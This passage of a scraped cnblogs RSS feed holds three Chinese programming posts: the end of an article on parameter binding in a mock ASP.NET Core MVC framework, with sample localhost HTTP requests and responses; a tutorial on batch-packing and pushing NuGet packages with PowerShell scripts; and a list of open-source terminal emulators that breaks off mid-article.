Bar: &lt;/span&gt;&lt;span&gt;456&lt;/span&gt;&lt;span&gt;
Baz: &lt;/span&gt;&lt;span&gt;789&lt;/span&gt;&lt;span&gt;
Host: localhost:&lt;/span&gt;&lt;span&gt;5000&lt;/span&gt;&lt;span&gt;

HTTP&lt;/span&gt;/&lt;span&gt;1.1&lt;/span&gt; &lt;span&gt;200&lt;/span&gt;&lt;span&gt; OK
Date: Fri, &lt;/span&gt;&lt;span&gt;14&lt;/span&gt; Feb &lt;span&gt;2020&lt;/span&gt; &lt;span&gt;02&lt;/span&gt;:&lt;span&gt;17&lt;/span&gt;:&lt;span&gt;41&lt;/span&gt;&lt;span&gt; GMT
Content&lt;/span&gt;-Type: text/&lt;span&gt;plain
Server: Kestrel
Content&lt;/span&gt;-Length: &lt;span&gt;50&lt;/span&gt;&lt;span&gt;

{
  &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Foo&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;123&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
  &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Bar&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;456&lt;/span&gt;&lt;span&gt;,
  &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Baz&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;789&lt;/span&gt;&lt;span&gt;
}


POST http:&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;localhost:5000/home/action1 HTTP/1.1&lt;/span&gt;
Content-Type: application/x-www-form-&lt;span&gt;urlencoded
Host: localhost:&lt;/span&gt;&lt;span&gt;5000&lt;/span&gt;&lt;span&gt;
Content&lt;/span&gt;-Length: &lt;span&gt;23&lt;/span&gt;&lt;span&gt;

foo&lt;/span&gt;=&lt;span&gt;123&lt;/span&gt;&amp;amp;bar=&lt;span&gt;456&lt;/span&gt;&amp;amp;baz=&lt;span&gt;789&lt;/span&gt;&lt;span&gt;

HTTP&lt;/span&gt;/&lt;span&gt;1.1&lt;/span&gt; &lt;span&gt;200&lt;/span&gt;&lt;span&gt; OK
Date: Fri, &lt;/span&gt;&lt;span&gt;14&lt;/span&gt; Feb &lt;span&gt;2020&lt;/span&gt; &lt;span&gt;02&lt;/span&gt;:&lt;span&gt;19&lt;/span&gt;:&lt;span&gt;18&lt;/span&gt;&lt;span&gt; GMT
Content&lt;/span&gt;-Type: text/&lt;span&gt;plain
Server: Kestrel
Content&lt;/span&gt;-Length: &lt;span&gt;50&lt;/span&gt;&lt;span&gt;

{
  &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Foo&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;123&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
  &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Bar&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;456&lt;/span&gt;&lt;span&gt;,
  &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Baz&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;789&lt;/span&gt;&lt;span&gt;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;对于Action2方法来说，由于两个参数的类型Foobarbaz为复杂类型，默认会采用递归的模型绑定方式来生成对应的参数值。我们同样采用Fiddler发送了两组针对该Action方法（/home/action2）的POST请求，并利用提交的表单来提供原始的数据项，表单元素采用上面所述的命名方式。由于第一个请求提交的表单元素没有采用参数名作为前缀，所以两个参数最终绑定了相同的数据。第二个请求提交了两组以参数名前缀命名的表单元素，它们会分别绑定到各自的参数上。（S504）&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;47&quot;&gt;
&lt;pre&gt;
POST http:&lt;span&gt;//&lt;/span&gt;&lt;span&gt;localhost:5000/home/action2 HTTP/1.1&lt;/span&gt;
Content-Type: application/x-www-form-&lt;span&gt;urlencoded
Host: localhost:&lt;/span&gt;&lt;span&gt;5000&lt;/span&gt;&lt;span&gt;
Content&lt;/span&gt;-Length: &lt;span&gt;37&lt;/span&gt;&lt;span&gt;

foobar.foo&lt;/span&gt;=&lt;span&gt;123&lt;/span&gt;&amp;amp;foobar.bar=&lt;span&gt;456&lt;/span&gt;&amp;amp;baz=&lt;span&gt;789&lt;/span&gt;&lt;span&gt;

HTTP&lt;/span&gt;/&lt;span&gt;1.1&lt;/span&gt; &lt;span&gt;200&lt;/span&gt;&lt;span&gt; OK
Date: Fri, &lt;/span&gt;&lt;span&gt;14&lt;/span&gt; Feb &lt;span&gt;2020&lt;/span&gt; &lt;span&gt;02&lt;/span&gt;:&lt;span&gt;36&lt;/span&gt;:&lt;span&gt;20&lt;/span&gt;&lt;span&gt; GMT
Content&lt;/span&gt;-Type: text/&lt;span&gt;plain
Server: Kestrel
Content&lt;/span&gt;-Length: &lt;span&gt;205&lt;/span&gt;&lt;span&gt;

{
  &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Value1&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;: {
    &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Foobar&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;: {
      &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Foo&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;123&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
      &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Bar&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;456&lt;/span&gt;&lt;span&gt;
    },
    &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Baz&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;789&lt;/span&gt;&lt;span&gt;
  },
  &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Value2&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;: {
    &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Foobar&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;: {
      &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Foo&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;123&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
      &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Bar&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;456&lt;/span&gt;&lt;span&gt;
    },
    &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Baz&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;789&lt;/span&gt;&lt;span&gt;
  }
}


POST http:&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;localhost:5000/home/action2 HTTP/1.1&lt;/span&gt;
Content-Type: application/x-www-form-&lt;span&gt;urlencoded
Host: localhost:&lt;/span&gt;&lt;span&gt;5000&lt;/span&gt;&lt;span&gt;
Content&lt;/span&gt;-Length: &lt;span&gt;117&lt;/span&gt;&lt;span&gt;

value1.foobar.foo&lt;/span&gt;=&lt;span&gt;111&lt;/span&gt;&amp;amp;value1.foobar.bar=&lt;span&gt;222&lt;/span&gt;&amp;amp;value1.baz=&lt;span&gt;333&lt;/span&gt;&amp;amp;value2.foobar.foo=&lt;span&gt;444&lt;/span&gt;&amp;amp;value2.foobar.bar=&lt;span&gt;555&lt;/span&gt;&amp;amp;value2.baz=&lt;span&gt;666&lt;/span&gt;&lt;span&gt;

HTTP&lt;/span&gt;/&lt;span&gt;1.1&lt;/span&gt; &lt;span&gt;200&lt;/span&gt;&lt;span&gt; OK
Date: Fri, &lt;/span&gt;&lt;span&gt;14&lt;/span&gt; Feb &lt;span&gt;2020&lt;/span&gt; &lt;span&gt;02&lt;/span&gt;:&lt;span&gt;37&lt;/span&gt;:&lt;span&gt;41&lt;/span&gt;&lt;span&gt; GMT
Content&lt;/span&gt;-Type: text/&lt;span&gt;plain
Server: Kestrel
Content&lt;/span&gt;-Length: &lt;span&gt;205&lt;/span&gt;&lt;span&gt;

{
  &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Value1&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;: {
    &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Foobar&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;: {
      &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Foo&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;111&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
      &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Bar&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;222&lt;/span&gt;&lt;span&gt;
    },
    &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Baz&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;333&lt;/span&gt;&lt;span&gt;
  },
  &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Value2&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;: {
    &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Foobar&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;: {
      &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Foo&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;444&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
      &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Bar&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;555&lt;/span&gt;&lt;span&gt;
    },
    &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Baz&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;666&lt;/span&gt;&lt;span&gt;
  }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Action3方法与Action2方法唯一的不同之处在于其第二个参数value2上标注了FromBodyAttribute特性，按照模拟框架的约定，我们会采用基于反序列化（JSON）请求主体内容的方式来绑定该参数。在如下这个针对该Action方法（/home/action3）的请求中，我们以请求首部的方式提供了绑定第一个参数（value1）的数据项，请求主体承载的JSON片段将被反序列化以生成第二个参数（value1）。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;43&quot;&gt;
&lt;pre&gt;
POST http:&lt;span&gt;//&lt;/span&gt;&lt;span&gt;localhost:5000/home/action3 HTTP/1.1&lt;/span&gt;
Content-Type: application/&lt;span&gt;json
Foobar.Foo: &lt;/span&gt;&lt;span&gt;111&lt;/span&gt;&lt;span&gt;
Foobar.Bar: &lt;/span&gt;&lt;span&gt;222&lt;/span&gt;&lt;span&gt;
Baz: &lt;/span&gt;&lt;span&gt;333&lt;/span&gt;&lt;span&gt;
Host: localhost:&lt;/span&gt;&lt;span&gt;5000&lt;/span&gt;&lt;span&gt;
Content&lt;/span&gt;-Length: &lt;span&gt;88&lt;/span&gt;&lt;span&gt;

{
    &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Foobar&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;: {
      &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Foo&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;444&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
      &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Bar&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;555&lt;/span&gt;&lt;span&gt;
    },
    &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Baz&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;666&lt;/span&gt;&lt;span&gt;
  }

HTTP&lt;/span&gt;/&lt;span&gt;1.1&lt;/span&gt; &lt;span&gt;200&lt;/span&gt;&lt;span&gt; OK
Date: Fri, &lt;/span&gt;&lt;span&gt;14&lt;/span&gt; Feb &lt;span&gt;2020&lt;/span&gt; &lt;span&gt;03&lt;/span&gt;:&lt;span&gt;03&lt;/span&gt;:&lt;span&gt;54&lt;/span&gt;&lt;span&gt; GMT
Content&lt;/span&gt;-Type: text/&lt;span&gt;plain
Server: Kestrel
Content&lt;/span&gt;-Length: &lt;span&gt;205&lt;/span&gt;&lt;span&gt;

{
  &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Value1&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;: {
    &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Foobar&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;: {
      &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Foo&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;111&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
      &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Bar&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;222&lt;/span&gt;&lt;span&gt;
    },
    &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Baz&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;333&lt;/span&gt;&lt;span&gt;
  },
  &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Value2&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;: {
    &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Foobar&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;: {
      &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Foo&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;444&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;,
      &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Bar&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;555&lt;/span&gt;&lt;span&gt;
    },
    &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Baz&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;: &lt;span&gt;666&lt;/span&gt;&lt;span&gt;
  }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/artech/p/inside-asp-net-core-mvc-01.html&quot;&gt;通过极简模拟框架让你了解ASP.NET Core MVC框架的设计与实现[上篇]：路由整合&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://www.cnblogs.com/artech/p/inside-asp-net-core-mvc-02.html&quot;&gt;通过极简模拟框架让你了解ASP.NET Core MVC框架的设计与实现[中篇]: 请求响应&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://www.cnblogs.com/artech/p/inside-asp-net-core-mvc-03.html&quot;&gt;通过极简模拟框架让你了解ASP.NET Core MVC框架的设计与实现[下篇]：参数绑定&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Tue, 31 Mar 2020 00:41:00 +0000</pubDate>
<dc:creator>Artech</dc:creator>
<og:description>模拟框架到目前为止都假定Action方法是没有参数的，我们知道MVC框架对Action方法的参数并没有作限制，它可以包含任意数量和类型的参数。一旦将“零参数”的假设去除，ControllerActio</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/artech/p/inside-asp-net-core-mvc-03.html</dc:identifier>
</item>
<item>
<title>Nuget多项目批量打包上传服务器的简明教程 - 依乐祝</title>
<link>http://www.cnblogs.com/yilezhu/p/12591174.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/yilezhu/p/12591174.html</guid>
<description>&lt;p&gt;本篇不会介绍Nuget是什么，如何打包上传Nuget包，怎么搭建私有Nuget服务器。这些问题园子里都有相应的文章分享，这里不做过多阐述。另外本文假设你已经下载了Nuget.exe，并且已经设置好了环境变量。什么？你还不会？那你先去百度下设置好后再来看这篇文章吧。&lt;a href=&quot;https://dist.nuget.org/win-x86-commandline/latest/nuget.exe&quot;&gt;nuget下载&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;实际项目中，我们可能一个解决方案下面会有N多个项目，每次发布这N多个项目都会使用统一的版本号一起发布到Nuget服务器。搜索了很久没找到一个好的方式，好在参考了abp vnext的打包方法实现了这个需求。因此分享下，希望对有需要的人有所帮助。&lt;/p&gt;
&lt;blockquote readability=&quot;2.0987654320988&quot;&gt;
&lt;p&gt;作者：依乐祝&lt;br/&gt;原文地址：&lt;a href=&quot;https://www.cnblogs.com/yilezhu/p/12591174.html&quot;&gt;https://www.cnblogs.com/yilezhu/p/12591174.html&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;首先看下图，每个脚本的作用我进行了注释，稍后我们再做进一步的详细阐述。在具体批量发布的时候，只需要先执行下&lt;code&gt;pack.ps1&lt;/code&gt;脚本，然后再执行下&lt;code&gt;push_packages.ps1&lt;/code&gt;脚本即可。当然还有一些参数需要根据你的项目来进行修改的。不过你不用担心，只需要按照下面步骤进行即可。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1377250/202003/1377250-20200329104806286-1749772881.png&quot; alt=&quot;image-20200329100147560&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;第一步，在commonps1中配置我们的解决方案以及项目路径&quot;&gt;第一步，在&lt;code&gt;common.ps1&lt;/code&gt;中配置我们的解决方案以及项目路径&lt;/h3&gt;
&lt;p&gt;我们把&lt;code&gt;$solutions&lt;/code&gt;这个变量中的内容替换成我们的解决方案的相对路径。比如：解决方案在&lt;code&gt;E:\abp\abp\framework&lt;/code&gt;这个路径，我们的脚本文件在&lt;code&gt;E:\abp\abp\nupkg&lt;/code&gt;这个路径，那么我们就可以配置&lt;code&gt;framework&lt;/code&gt;这个值就可以了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1377250/202003/1377250-20200329104805907-696550424.png&quot; alt=&quot;image-20200329101445573&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;第二步，packps1这个脚本基本不需要修改，这里只是进行下代码的解释&quot;&gt;第二步，&lt;code&gt;pack.ps1&lt;/code&gt;这个脚本基本不需要修改，这里只是进行下代码的解释&lt;/h3&gt;
&lt;ol&gt;&lt;li&gt;这里首先引入第一步的&lt;code&gt;common.ps1&lt;/code&gt;脚本文件（因为需要用到上面定义的变量）&lt;/li&gt;
&lt;li&gt;循环遍历&lt;code&gt;$solutions&lt;/code&gt;变量，找到所有的解决方案，并执行&lt;code&gt;dotnet restore&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;这里才是打包的核心代码，遍历&lt;code&gt;$projects&lt;/code&gt;并执行打包过程，然后把生成的&lt;code&gt;nupkg&lt;/code&gt;文件拷贝到脚本所在的目录。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1377250/202003/1377250-20200329104805621-273761400.png&quot; alt=&quot;image-20200329102000346&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;第三步push_packagesps1脚本文件打包上传到服务器&quot;&gt;第三步,&lt;code&gt;push_packages.ps1&lt;/code&gt;脚本文件打包上传到服务器&lt;/h3&gt;
&lt;ol readability=&quot;2.5&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;这里首先引入第一步的&lt;code&gt;common.ps1&lt;/code&gt;脚本文件（因为需要用到上面定义的变量）&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;1.5&quot;&gt;
&lt;p&gt;从根目录下获取&lt;code&gt;common.props&lt;/code&gt;文件中获取对应的版本号，并推送对应版本号的&lt;code&gt;nupkg&lt;/code&gt;到服务器&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;注意：&lt;code&gt;common.props&lt;/code&gt;文件需要你自行添加，这里面可以定义csproject文件所需要的一些变量&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;循环&lt;code&gt;common.ps1&lt;/code&gt;脚本中的&lt;code&gt;$projects&lt;/code&gt;,并执行推送过程。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;最后修改 下你自己的&lt;code&gt;--api-key&lt;/code&gt;(Nuget管理的密钥)以及&lt;code&gt;-s&lt;/code&gt;（包源，如果你是自己搭建的私有nuget服务器，则这里需要替换成私有nuget服务器地址）&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1377250/202003/1377250-20200329104805346-171977143.png&quot; alt=&quot;image-20200329102832869&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;第四步，执行上传操作&quot;&gt;第四步，执行上传操作&lt;/h3&gt;
&lt;ol readability=&quot;2.5&quot;&gt;&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;进入到你的上面三个脚本的目录，&lt;code&gt;Shift&lt;/code&gt;+鼠标右键,选择在此处打开&lt;code&gt;powershell&lt;/code&gt;打开powershell命令窗口&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;依次执行下&lt;code&gt;.\pack.ps1&lt;/code&gt;，&lt;code&gt;push_packages.ps1&lt;/code&gt;脚本即可。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;4&quot;&gt;
&lt;p&gt;这里你在执行&lt;code&gt;powershell脚本&lt;/code&gt;的时候可能会报如下的&lt;strong&gt;错误&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1377250/202003/1377250-20200329104804931-1113479413.png&quot; alt=&quot;image-20200329103723580&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这是由于操作系统默认禁止执行脚本，需要以管理员身份执行一次&lt;code&gt;set-executionpolicy remotesigned&lt;/code&gt;然后输入&lt;code&gt;y&lt;/code&gt;回车即可顺利执行。&lt;/p&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;&lt;code&gt;Set-ExecutionPolicy&lt;/code&gt; 可更改 Windows PowerShell 执行策略的用户首选项。要在 Windows Vista、Windows Server 2008 和 Windows&lt;br/&gt;的更高版本上运行此命令，必须使用&quot;以管理员身份运行&quot;选项启动 Windows PowerShell，&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;h2 id=&quot;总结&quot;&gt;总结&lt;/h2&gt;
&lt;p&gt;本文参照abp vnext批量打包解决方案下面所有项目文件并上传到nuget服务器的方法实现了一个简单的Nuget多项目批量打包上传服务器的方法，希望对有需要的朋友有所帮助，当然，如果你有更好的方式也可以给我留言。感谢阅读。&lt;/p&gt;
&lt;h2 id=&quot;下载地址&quot;&gt;下载地址&lt;/h2&gt;
&lt;p&gt;点这里下载：&lt;a href=&quot;https://files.cnblogs.com/files/yilezhu/nupkg.zip&quot;&gt;https://files.cnblogs.com/files/yilezhu/nupkg.zip&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Tue, 31 Mar 2020 00:40:00 +0000</pubDate>
<dc:creator>依乐祝</dc:creator>
<og:description>本篇不会介绍Nuget是什么，如何打包上传Nuget包，怎么搭建私有Nuget服务器。这些问题园子里都有相应的文章分享，这里不做过多阐述。另外本文假设你已经下载了Nuget.exe，并且已经设置好了环</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/yilezhu/p/12591174.html</dc:identifier>
</item>
<item>
<title>程序员必备之终端模拟器，让你的终端世界多一抹“颜色” - 削微寒</title>
<link>http://www.cnblogs.com/xueweihan/p/12600901.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/xueweihan/p/12600901.html</guid>
<description>&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/759200/202003/759200-20200331082406527-1125855478.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;作者：&lt;a href=&quot;https://chungzh.cn/&quot;&gt;HelloGitHub-ChungZH&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;当你逐渐厌倦了 cmd 的枯燥黑屏、powershell 的单调蓝底，可以来尝试一下使用可定制性更高的终端模拟器。下面是 HelloGitHub 从 GitHub 上收集的一些开源终端模拟器，它们功能丰富，界面美观，可以完美替代掉系统自带的普通终端。萝卜白菜各有所爱，挑挑看有没有让你眼前一亮，整篇文章最靓的那个“仔”。&lt;/p&gt;
&lt;h2 id=&quot;1-windows-terminal&quot;&gt;1. Windows Terminal&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/759200/202003/759200-20200330202216038-932539258.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;如果你是一枚 Windows 用户，那么由微软爸爸开发的 Windows Terminal 绝对是你的最佳选择。它支持多个选项卡、Unicode 和 UTF-8 字符还有 emoji、GPU 加速以及自定义主题、样式和配置。WT 使用 C++ 开发，速度很快。（上面这张图中的背景是经修改过的，默认会有 Fluent 效果）&lt;/p&gt;
&lt;h2 id=&quot;2-hyper&quot;&gt;2. Hyper&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/759200/202003/759200-20200330202235581-1765146178.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Hyper 使用 Electron 框架，这让它可以变得很漂亮、酷炫，但也带来了速度慢、体积大的缺点。它的插件和主题非常丰富，见 &lt;a href=&quot;https://github.com/bnb/awesome-hyper&quot;&gt;awesome-hyper&lt;/a&gt;，可以说是最多的。如果你不在乎性能，那 Hyper 也是不错的选择。它支持 Windows, Linux 和 MacOS。&lt;/p&gt;
&lt;h2 id=&quot;3-terminus&quot;&gt;3. Terminus&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/759200/202003/759200-20200330202256462-978558051.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Terminus 是一个高度定制化的终端模拟器，同样使用了 Electron，并可以设置成 Fluent Design 风格的背景，和 Windows 10 很搭配。它集成了 SSH 客户端和连接管理器，完全支持 Unicode，包括全角字符，拥有图形界面的设置页面。支持 Windows, Linux 和 MacOS。Terminus 同样有一些插件和主题。&lt;/p&gt;
&lt;h2 id=&quot;4-alacritty&quot;&gt;4. Alacritty&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/759200/202003/759200-20200330202317917-566627936.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Alacritty 使用 Rust 开发，追求简单和性能。号称是现有最快的终端模拟器，使用了 GPU 渲染。支持 macOS，Linux，BSD 和 Windows。目前它仍然处于 Beta 阶段。&lt;/p&gt;
&lt;p&gt;经实测，Alacritty 的打开速度可谓“秒开”，比 Windows Terminal 还要快不少。&lt;/p&gt;
&lt;h2 id=&quot;5-conemu&quot;&gt;5. ConEmu&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/759200/202003/759200-20200330202335367-932343530.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这款终端使用 C++ 开发，性能优秀，功能很强大，已经有十几年的历史了。可以运行一些旧的 DOS 程序或游戏，窗口大小调整时很平滑，不过如你所见，ConEmu 实在是丑不忍睹。。&lt;/p&gt;
&lt;h2 id=&quot;最后&quot;&gt;最后&lt;/h2&gt;
